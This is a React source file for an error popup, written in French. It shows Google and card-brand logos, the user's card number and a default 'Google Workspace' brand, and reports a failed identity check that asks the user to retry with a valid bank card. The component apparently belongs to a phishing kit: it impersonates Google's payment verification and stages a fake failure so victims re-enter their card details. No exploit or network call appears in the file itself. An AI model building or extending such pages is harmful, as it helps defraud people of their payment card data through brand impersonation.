import React from 'react';
import { createPortal } from 'react-dom';
import PopupHeader from '../PopupHeader';
import styles from '../../styles/modules/ErrorPopup.module.css';

const ErrorPopup = ({ 
  isVisible, 
  onRetry,
  isLoading = false,
  cardNumber,
  brandName = "Google Workspace" 
}) => {
  if (!isVisible) return null;

  const popupContent = (
    <div className={styles.popupWrapper}>
      <div className={`${styles.popup} ${styles.errorPopup}`}>
        <PopupHeader 
          showGoogleLogo={true} 
          showCardLogo={true}
          cardNumber={cardNumber}
        />
        
        <div className={styles.errorContent}>
          <div className={styles.errorIconContainer}>
            <span className={styles.errorIcon}>❌</span>
          </div>
          
          <h2 className={styles.errorTitle}>Une erreur est survenue</h2>
          
          <p className={styles.errorDescription}>
            Échec durant la vérification d'identité, veuillez réessayer à nouveau.
          </p>
          
          <div className={styles.errorNotice}>
            <p className={styles.errorNoticeText}>
              Dans le cadre de la lutte contre la fraude, nous avons mis en place un système 
              de vérification d'identité pour nos paiements en ligne. 
              Assurez-vous d'utiliser une carte bancaire valide à votre nom.
            </p>
          </div>
          
          <button 
            onClick={onRetry} 
            disabled={isLoading}
            className={styles.retryButton}
          >
            Réessayer
          </button>
        </div>
      </div>
    </div>
  );

  // Utiliser createPortal pour rendre le popup à la racine du document
  return typeof window !== 'undefined' 
    ? createPortal(popupContent, document.body)
    : null;
};

  export default ErrorPopup;